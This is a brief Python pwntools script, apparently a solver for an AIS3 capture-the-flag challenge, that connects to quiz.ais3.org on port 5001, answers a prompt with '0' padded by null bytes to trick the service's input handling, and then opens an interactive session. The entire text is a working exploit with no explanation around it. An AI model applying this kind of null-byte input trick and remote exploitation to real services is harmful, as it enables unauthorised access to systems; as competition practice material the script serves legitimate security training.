#!/usr/bin/python3

from pwn import *

r = remote('quiz.ais3.org', 5001)

r.sendlineafter('do you need more ?', b'0'.ljust(15, b'\x00'))
r.interactive()